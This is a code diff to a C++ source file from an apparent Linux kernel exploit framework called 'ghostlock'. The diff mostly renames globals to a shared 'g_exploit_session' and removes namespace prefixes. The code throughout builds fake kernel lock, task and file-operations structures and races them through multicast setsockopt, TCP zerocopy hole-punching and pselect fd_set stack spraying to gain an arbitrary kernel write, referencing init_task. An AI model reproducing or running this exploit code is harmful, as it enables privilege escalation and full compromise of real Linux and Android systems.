@@ -17,6 +17,8 @@
 #include "routes/select_stack_route.h"
 #include "routes/tcp_zerocopy_route.h"
 
+using namespace ghostlock;
+
 namespace ghostlock::route {
 
 /* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
@@ -27,7 +29,7 @@ static double fops_elapsed_ms(struct timespec *ref) {
 }
 
 static const struct execution_settings *execution_settings(void) {
-    return target_profile_execution(&g_target_profile);
+    return target_profile_execution(&g_exploit_session.profile);
 }
 
 /* Resident multicast writer wrappers (CPP13): the owning class lives in
@@ -48,16 +50,16 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
     (void) request;
     RouteStatus status = {.code = ROUTE_RETRYABLE};
     MulticastWaiterLayout layout =
-            target_profile_multicast_waiter_layout(&g_target_profile);
+            target_profile_multicast_waiter_layout(&g_exploit_session.profile);
     size_t stamp_size = layout.buffer_size;
     /* VLA size comes from the validated profile geometry; the encode step
      * rejects an undersized buffer before any indexed write. */
     __extension__ unsigned char stamp[stamp_size];  // NOLINT(clang-analyzer-core.VLASize)
     memset(stamp, 0, sizeof(stamp));
-    if (!ghostlock::encode_multicast_waiter(
+    if (!encode_multicast_waiter(
             {reinterpret_cast<std::byte *>(stamp), stamp_size},
             layout.waiter_offset, layout.task_offset, layout.lock_offset,
-            (g_heap_context.current.fake_task), (g_heap_context.current.fake_lock))) {
+            (g_exploit_session.heap.current.fake_task), (g_exploit_session.heap.current.fake_lock))) {
         status.step = 59;
         status.error_number = EOVERFLOW;
         status.userspace_clean = 1;
@@ -79,27 +81,27 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
         status.code = ROUTE_FALLBACK_SAFE;
         return status;
     }
-    atomic_store(&ghostlock::g_exploit_session.race.consumer_calls, 0);
-    atomic_store(&ghostlock::g_exploit_session.race.consumer_success, 0);
-    atomic_store(&ghostlock::g_exploit_session.race.consumer_stop, 0);
-    atomic_store(&ghostlock::g_exploit_session.race.route_delay_usec, 0);
+    atomic_store(&g_exploit_session.race.consumer_calls, 0);
+    atomic_store(&g_exploit_session.race.consumer_success, 0);
+    atomic_store(&g_exploit_session.race.consumer_stop, 0);
+    atomic_store(&g_exploit_session.race.route_delay_usec, 0);
     errno = 0;
     int stamp_result =
             setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
     status.step = 61;
     status.error_number = errno;
-    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 1);
+    atomic_store(&g_exploit_session.race.consumer_go, 1);
     for (int spin = 0; spin < 100000000 &&
-            atomic_load(&ghostlock::g_exploit_session.race.consumer_calls) == 0; spin++)
+            atomic_load(&g_exploit_session.race.consumer_calls) == 0; spin++)
         __asm__ volatile("yield":: : "memory");
-    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 0);
-    while (atomic_load(&ghostlock::g_exploit_session.race.consumer_inflight))
+    atomic_store(&g_exploit_session.race.consumer_go, 0);
+    while (atomic_load(&g_exploit_session.race.consumer_inflight))
         __asm__ volatile("yield":: : "memory");
     close(fd);
     status.userspace_clean = 1;
     status.kernel_disarmed = 1;
     if (stamp_result == 0 ||
-            atomic_load(&ghostlock::g_exploit_session.race.consumer_success) > 0) {
+            atomic_load(&g_exploit_session.race.consumer_success) > 0) {
         status.step = 0;
         status.error_number = 0;
         status.code = ROUTE_OK;
@@ -129,7 +131,7 @@ static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
 /* Decoupling plan: create a connected loopback TCP pair. Input: output slots;
  * output: 0/-1 and owned descriptors recorded in TcpZerocopyRouteContext. */
 static int tcp_make_pair(TcpZerocopyRouteContext *context) {
-    ghostlock::UniqueFd listener(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
+    UniqueFd listener(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
     if (!listener.valid()) {
         return -1;
     }
@@ -161,7 +163,7 @@ static int tcp_make_pair(TcpZerocopyRouteContext *context) {
         return -1;
     }
 
-    context->server_fd.reset(accept4(listener.get(), NULL, NULL, SOCK_CLOEXEC));
+    context->server_fd.reset(accept4(listener.get(), nullptr, nullptr, SOCK_CLOEXEC));
     if (!context->server_fd.valid()) {
         context->client_fd.reset();
         return -1;
@@ -172,7 +174,7 @@ static int tcp_make_pair(TcpZerocopyRouteContext *context) {
 /* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
  * TcpZerocopyRouteContext; output: context-owned phase/error flags. */
 static void *tcp_punch_thread(void *arg) {
-    ghostlock::support::disable_rseq_for_thread();
+    support::disable_rseq_for_thread();
     auto *context = static_cast<TcpZerocopyRouteContext *>(arg);
     while (!atomic_load(&context->punch_go) &&
             !atomic_load(&context->punch_stop)) {
@@ -199,21 +201,21 @@ static void *tcp_punch_thread(void *arg) {
             break;
         }
     }
-    return NULL;
+    return nullptr;
 }
 
 /* Acquire every userspace resource owned by the TCP route. No PI consumer or
  * punch operation is armed until this function has completed successfully. */
 }  // namespace ghostlock::route
 
-int ghostlock::TcpZerocopyRoute::prepare() noexcept {
-    if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
+int TcpZerocopyRoute::prepare() noexcept {
+    if (!(g_exploit_session.heap.current.base) || !(g_exploit_session.heap.current.fake_lock) || !(g_exploit_session.heap.current.fake_fops)) {
         pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
-                (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_fops));
+                (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock), (g_exploit_session.heap.current.fake_fops));
         return fail(40, 0);
     }
 
-    if (ghostlock::route::tcp_make_pair(this) != 0) {
+    if (route::tcp_make_pair(this) != 0) {
         pr_warning("tcp route pair setup failed errno=%d\n", errno);
         return fail(41, errno);
     }
@@ -226,7 +228,7 @@ int ghostlock::TcpZerocopyRoute::prepare() noexcept {
         pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
         return fail(42, errno);
     }
-    void *mapped = mmap(NULL, mapping_length, PROT_READ | PROT_WRITE,
+    void *mapped = mmap(nullptr, mapping_length, PROT_READ | PROT_WRITE,
             MAP_SHARED, punch_fd.get(), 0);
     if (mapped == MAP_FAILED) {
         pr_warning("tcp route mmap errno=%d\n", errno);
@@ -242,7 +244,7 @@ int ghostlock::TcpZerocopyRoute::prepare() noexcept {
     atomic_store(&race->consumer_go, 0);
     atomic_store(&race->consumer_calls, 0);
     atomic_store(&race->consumer_success, 0);
-    int thread_error = punch_worker.start(ghostlock::route::tcp_punch_thread, this);
+    int thread_error = punch_worker.start(route::tcp_punch_thread, this);
     if (thread_error != 0) {
         pr_warning("tcp route punch thread errno=%d\n", thread_error);
         return fail(44, thread_error);
@@ -251,7 +253,7 @@ int ghostlock::TcpZerocopyRoute::prepare() noexcept {
 }
 
 /* Run the route after prepare has established exclusive resource ownership. */
-RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
+RouteStatus TcpZerocopyRoute::execute() noexcept {
     /* waiter->task carries init_task's phys alias, not the image address */
     uintptr_t waiter_task = SLIDE_INIT_TASK;
     int arm_seq = (int) execution->tcp_arm_sequence;
@@ -261,7 +263,7 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
 
     pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
             "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
-            (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_w0), (g_heap_context.current.fake_task), waiter_task,
+            (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock), (g_exploit_session.heap.current.fake_w0), (g_exploit_session.heap.current.fake_task), waiter_task,
             attempts, arm_seq, post_hold);
 
     atomic_store(&punch_go, 1);
@@ -294,12 +296,12 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
 
         unsigned char zc[0x40];
         memset(zc, 0, sizeof(zc));
-        ghostlock::support::put64(zc, 0x18,
+        support::put64(zc, 0x18,
                 (uint64_t)(uintptr_t)(static_cast<unsigned char *>(
                         mapping.data()) + page_size));
-        ghostlock::support::put32(zc, 0x20, sizeof(sendbuf));
-        ghostlock::support::put64(zc, 0x28, waiter_task);
-        ghostlock::support::put64(zc, 0x30, (g_heap_context.current.fake_lock));
+        support::put32(zc, 0x20, sizeof(sendbuf));
+        support::put64(zc, 0x28, waiter_task);
+        support::put64(zc, 0x30, (g_exploit_session.heap.current.fake_lock));
 
         socklen_t len = sizeof(zc);
         errno = 0;
@@ -314,7 +316,7 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
             for (int spin = 0; spin < post_hold; spin++) {
                 __asm__ volatile("yield":: : "memory");
             }
-            ghostlock::route::tcp_wait_for_consumer_idle(this);
+            route::tcp_wait_for_consumer_idle(this);
         }
 
         int calls = atomic_load(&race->consumer_calls);
@@ -346,7 +348,7 @@ namespace ghostlock::route {
  * common route dispatcher remains scheduled for S14. */
 RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
     TcpZerocopyRouteContext context(
-            &ghostlock::g_exploit_session.race, request, execution_settings(),
+            &g_exploit_session.race, request, execution_settings(),
             TCP_PUNCH_SHMEM_LEN);  // NOLINT(bugprone-implicit-widening-of-multiplication-result)
     if (context.prepare() == 0) {
         (void) context.execute();
@@ -384,12 +386,12 @@ static int route_delay_usec(const SelectStackRouteContext *context,
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
-    unsigned long *bits = (unsigned long *) set;
+    unsigned long *bits = reinterpret_cast<unsigned long *>(set);
     bits[word] = (unsigned long) value;
 }
 
 uint64_t fdset_get_word(const fd_set *set, int word) {
-    const unsigned long *bits = (const unsigned long *) set;
+    const unsigned long *bits = reinterpret_cast<const unsigned long *>(set);
     return bits[word];
 }
 
@@ -409,13 +411,13 @@ static int pselect_put_global_word(
     int word_idx = global_word % words_per_set;
     switch (set_idx) {
         case 0:
-            ghostlock::route::fdset_put_word(in, word_idx, value);
+            fdset_put_word(in, word_idx, value);
             return 1;
         case 1:
-            ghostlock::route::fdset_put_word(out, word_idx, value);
+            fdset_put_word(out, word_idx, value);
             return 1;
         case 2:
-            ghostlock::route::fdset_put_word(ex, word_idx, value);
+            fdset_put_word(ex, word_idx, value);
             return 1;
         default:
             return 0;
@@ -425,7 +427,7 @@ static int pselect_put_global_word(
 /* Decoupling plan: read the select-stack waiter layout. Input: profile; output:
  * word shift. Future: select_stack_waiter_shift(const TargetProfile *). */
 static int pselect_waiter_shift(const SelectStackRouteContext *context) {
-    return target_profile_is_loaded(&g_target_profile)
+    return target_profile_is_loaded(&g_exploit_session.profile)
             ? context->layout.waiter_shift
             : PSELECT_WAITER_WORD_SHIFT;
 }
@@ -436,8 +438,8 @@ static int pselect_waiter_shift(const SelectStackRouteContext *context) {
 static void pselect_put_waiter_word(
         SelectStackRouteContext *context, int words_per_set,
         int waiter_word, uint64_t value, const char *name) {
-    int global_word = ghostlock::route::pselect_waiter_shift(context) + waiter_word;
-    int placed = ghostlock::route::pselect_put_global_word(
+    int global_word = pselect_waiter_shift(context) + waiter_word;
+    int placed = pselect_put_global_word(
             context->input_set.raw(), context->output_set.raw(),
             context->exception_set.raw(),
             words_per_set, global_word, value);
@@ -491,7 +493,7 @@ void reserve_standard_io(void) {
 /* Decoupling plan: restore standard descriptors from route-owned backups.
  * Input: route context; output: restored/closed state. Future:
  * select_stack_restore_stdio(SelectStackRouteContext *). */
-static void restore_standard_io(const ghostlock::BorrowedFd backup[3]) {
+static void restore_standard_io(const BorrowedFd backup[3]) {
     for (int fd = 0; fd < 3; fd++) {
         if (!backup[fd].valid()) continue;
         dup2(backup[fd].get(), fd);
@@ -502,9 +504,9 @@ static void restore_standard_io(const ghostlock::BorrowedFd backup[3]) {
  * profile, payload layout and write request; output: three fd_sets. Future:
  * ghostlock::route::select_stack_build_fdsets(profile, payload, request, result). */
 static void select_stack_build_fdsets(SelectStackRouteContext *context) {
-    ghostlock::FdSet *in = &context->input_set;
-    ghostlock::FdSet *out = &context->output_set;
-    ghostlock::FdSet *ex = &context->exception_set;
+    FdSet *in = &context->input_set;
+    FdSet *out = &context->output_set;
+    FdSet *ex = &context->exception_set;
     const WriteRequest *request = context->request;
     in->zero();
     out->zero();
@@ -524,21 +526,21 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
          * the write value, children the write target; waiter->task is the
          * payload fake_task (planted fields for the PI walk). */
         struct pselect_waiter_word words[] = {
-                {2, (g_heap_context.current.fake_right), "tree_pc"},
+                {2, (g_exploit_session.heap.current.fake_right), "tree_pc"},
                 {3, 0, "tree_right"},
                 {4, request->target, "tree_left"},
-                {5, (g_heap_context.current.fake_right), "pi_pc"},
+                {5, (g_exploit_session.heap.current.fake_right), "pi_pc"},
                 {6, 0, "pi_right"},
                 {7, request->target, "pi_left"},
-                {8, (g_heap_context.current.fake_task), "task"},
-                {9, (g_heap_context.current.fake_lock), "lock"},
+                {8, (g_exploit_session.heap.current.fake_task), "task"},
+                {9, (g_exploit_session.heap.current.fake_lock), "lock"},
                 {10, ((uint64_t) FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
         };
         for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
             struct pselect_waiter_word *w = &words[i];
-            ghostlock::route::pselect_put_waiter_word(context, words_per_set,
+            pselect_put_waiter_word(context, words_per_set,
                     w->word, w->value, w->name);
         }
     } else {
@@ -554,13 +556,13 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
                 {9, 0, "pi_left"},
                 {10, 1, "pi_prio"},
                 {11, 0, "pi_deadline"},
-                {12, (g_heap_context.current.fake_task), "task"},
-                {13, (g_heap_context.current.fake_lock), "lock"},
+                {12, (g_exploit_session.heap.current.fake_task), "task"},
+                {13, (g_exploit_session.heap.current.fake_lock), "lock"},
                 {14, 3, "wake_state"},
         };
         for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
             struct pselect_waiter_word *w = &words[i];
-            ghostlock::route::pselect_put_waiter_word(context, words_per_set,
+            pselect_put_waiter_word(context, words_per_set,
                     w->word, w->value, w->name);
         }
     }
@@ -568,10 +570,10 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
 
 }  // namespace ghostlock::route
 
-int ghostlock::SelectStackRoute::prepare() noexcept {
-    if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
+int SelectStackRoute::prepare() noexcept {
+    if (!(g_exploit_session.heap.current.base) || !(g_exploit_session.heap.current.fake_lock) || !(g_exploit_session.heap.current.fake_fops)) {
         pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
-                   "fops=%016zx\n", (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_fops));
+                   "fops=%016zx\n", (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock), (g_exploit_session.heap.current.fake_fops));
         return fail(30, 0);
     }
     int fds[2];
@@ -595,23 +597,23 @@ int ghostlock::SelectStackRoute::prepare() noexcept {
         return fail(32, errno);
     }
 
-    ghostlock::route::select_stack_build_fdsets(this);
+    route::select_stack_build_fdsets(this);
     pr_info("pselect route setup shift=%d page=%016zx "
             "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
             "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
             "ex1=%016llx ex2=%016llx ex3=%016llx\n",
-            ghostlock::route::pselect_waiter_shift(this),
-            (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_w0), (g_heap_context.current.fake_task),
-            (unsigned long long) ghostlock::route::fdset_get_word(input_set.raw(), 0),
-            (unsigned long long) ghostlock::route::fdset_get_word(input_set.raw(), 3),
-            (unsigned long long) ghostlock::route::fdset_get_word(output_set.raw(), 0),
-            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 0),
-            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 1),
-            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 2),
-            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 3));
+            route::pselect_waiter_shift(this),
+            (g_exploit_session.heap.current.base), (g_exploit_session.heap.current.fake_lock), (g_exploit_session.heap.current.fake_w0), (g_exploit_session.heap.current.fake_task),
+            (unsigned long long) route::fdset_get_word(input_set.raw(), 0),
+            (unsigned long long) route::fdset_get_word(input_set.raw(), 3),
+            (unsigned long long) route::fdset_get_word(output_set.raw(), 0),
+            (unsigned long long) route::fdset_get_word(exception_set.raw(), 0),
+            (unsigned long long) route::fdset_get_word(exception_set.raw(), 1),
+            (unsigned long long) route::fdset_get_word(exception_set.raw(), 2),
+            (unsigned long long) route::fdset_get_word(exception_set.raw(), 3));
 
     /* The route may replace low fds, including stdout and stderr. */
-    ghostlock::route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
+    route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
             high_read.get(), pipe_write.get());
     owned_input_set = input_set;
     owned_output_set = output_set;
@@ -621,20 +623,20 @@ int ghostlock::SelectStackRoute::prepare() noexcept {
     return 0;
 }
 
-RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
+RouteStatus SelectStackRoute::execute() noexcept {
     struct timespec route_t0;
     clock_gettime(CLOCK_MONOTONIC, &route_t0);
 
     atomic_store(&race->consumer_calls, 0);
     atomic_store(&race->consumer_success, 0);
     atomic_store(&race->consumer_stop, 0);
-    int delay_usec = ghostlock::route::route_delay_usec(this, 1);
+    int delay_usec = route::route_delay_usec(this, 1);
     atomic_store(&race->route_delay_usec, delay_usec);
     atomic_store(&race->consumer_go, 1);
 
     pr_info("pselect pre-select compact=%d +%.0fms\n",
             layout.compact_waiter,
-            ghostlock::route::fops_elapsed_ms(&route_t0));
+            route::fops_elapsed_ms(&route_t0));
     errno = 0;
     if (layout.compact_waiter) {
         uint32_t timeout_us = execution->select_timeout_us;
@@ -644,7 +646,7 @@ RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
         };
         select_result = pselect(
                 PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
-                exception_set.raw(), &ts, NULL);
+                exception_set.raw(), &ts, nullptr);
     } else {
         uint32_t timeout_us = execution->select_timeout_us;
         struct timeval timeout = {
@@ -656,9 +658,9 @@ RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
                 exception_set.raw(), &timeout);
     }
     select_errno = errno;
-    ghostlock::route::restore_standard_io(stdio_backup);
+    route::restore_standard_io(stdio_backup);
     pr_info("pselect post-select compact=%d +%.0fms ret=%d\n",
-            layout.compact_waiter, ghostlock::route::fops_elapsed_ms(&route_t0),
+            layout.compact_waiter, route::fops_elapsed_ms(&route_t0),
             select_result);
     atomic_store(&race->consumer_go, 0);
 
@@ -682,8 +684,8 @@ RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
      * Keep this route invocation single-shot until ExploitSession can create a
      * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
     SelectStackRouteContext context(
-            &ghostlock::g_exploit_session.race, request, execution_settings(),
-            target_profile_select_stack_layout(&g_target_profile),
+            &g_exploit_session.race, request, execution_settings(),
+            target_profile_select_stack_layout(&g_exploit_session.profile),
             standard_io_backup);
     if (context.prepare() == 0) {
         (void) context.execute();
